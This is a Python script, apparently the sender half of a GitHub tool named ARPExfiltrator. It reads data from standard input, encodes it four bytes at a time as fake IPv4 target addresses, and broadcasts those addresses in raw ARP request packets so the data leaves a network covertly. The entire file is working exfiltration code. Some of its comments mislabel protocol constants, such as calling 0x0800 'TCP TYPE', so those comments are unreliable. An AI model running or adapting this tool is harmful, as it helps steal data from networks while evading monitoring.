#!/usr/bin/env python3

import struct
import socket
import binascii
import sys
from time import sleep

# source: https://github.com/nocommentlab/ARPExfiltrator/blob/master/sender.py

__ETH_PROTO_TYPE__ = 0x0806
__ARP_HARDWARE_TYPE__ = 0x01 # Ethernet Type
__ARP_PROTOCOL_TYPE__ = 0x0800 # TCP TYPE
__ARP_HARDWARE_ADDRESS_SIZE__ = 0x06 # MAC Address Size
__ARP_PROTOCOL_ADDRESS_SIZE__ = 0x04 # Ipv4 Address Size
__ARP_OP_CODE__ = 0x01 # ARP Request Operation Code
__ARP_HW_SOURCE_ADDRESS__ = 'f6:6b:50:99:aa:10'
__ARP_PROTO_SOURCE_ADDRESS__ = '10.42.10.21'
__ARP_HW_DST_ADDRESS__ = '00:00:00:00:00:00'
__SOCKET_PROTO_TYPE__ = 0x0003 # Gateway-Gateway Protocol. See /etc/protocol to more details.
__SOCKET_BIND_INTERFACE__ = 'enp0s18'

def main(payload_to_send):
    rawSocket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(__SOCKET_PROTO_TYPE__))
    rawSocket.bind((__SOCKET_BIND_INTERFACE__, socket.htons(__SOCKET_PROTO_TYPE__)))
    # Ethernet Header
    # Format Struct Pack in details:
    # !  = Network, you can use also > to rappresent the bytes order in big-endian
    # 6s = 6 byte of char 
    # 6s = 6 byte of char
    # H  = 2 byte of unsigned short
    p = [".".join([str(ord(n)) for n in payload_to_send[p:p+4]]) for p in range(0, len(payload_to_send), 4)]
    eth_hdr = struct.pack("!6s6sH", 
                            binascii.unhexlify(__ARP_HW_DST_ADDRESS__.replace(':', '')), 
                            binascii.unhexlify(__ARP_HW_SOURCE_ADDRESS__.replace(':', '')), 
                            __ETH_PROTO_TYPE__)


    send_arp_requests(rawSocket, eth_hdr, p)

def send_arp_requests(rawSocket, eth_hdr, ip_list):
    """
    Compose the ARP Header and sends the raw packet
    :param: rawSocket: The socket to use
    :param: eth_hdr:   The Ethernet Header to use
    :param: ip_list:   The obfuscated payload hidden inside the IPv4 list
    """
    for ip in ip_list:
        # ARP Header
        # Format Struct Pack in details:
        # !  = Network, you can use also > to rappresent the bytes order in big-endian
        # H  = 2 byte of unsigned short
        # H  = 2 byte of unsigned short
        # B  = 1 byte of unsigned char
        # B  = 1 byte of unsigned char
        # H  = 2 byte of unsigned short
        # 6s = 6 byte of char 
        # 4s = 4 byte of char
        # 6s = 6 byte of char 
        # 4s = 4 byte of char
        arp_hdr = struct.pack("!HHBBH6s4s6s4s", 
                            __ARP_HARDWARE_TYPE__, 
                            __ARP_PROTOCOL_TYPE__, 
                            __ARP_HARDWARE_ADDRESS_SIZE__, 
                            __ARP_PROTOCOL_ADDRESS_SIZE__, 
                            __ARP_OP_CODE__,
                            binascii.unhexlify(__ARP_HW_SOURCE_ADDRESS__.replace(':', '')), 
                            socket.inet_aton(__ARP_PROTO_SOURCE_ADDRESS__), 
                            binascii.unhexlify(__ARP_HW_DST_ADDRESS__.replace(':', '')), 
                            socket.inet_aton(ip))
        packet = eth_hdr + arp_hdr
        rawSocket.send(packet)
        sleep(0.01)

if __name__ == "__main__":
    """
    Main function that receives the input from stdin and appends the '$' character.
    """
    main(''.join(sys.stdin.readlines())+"$")
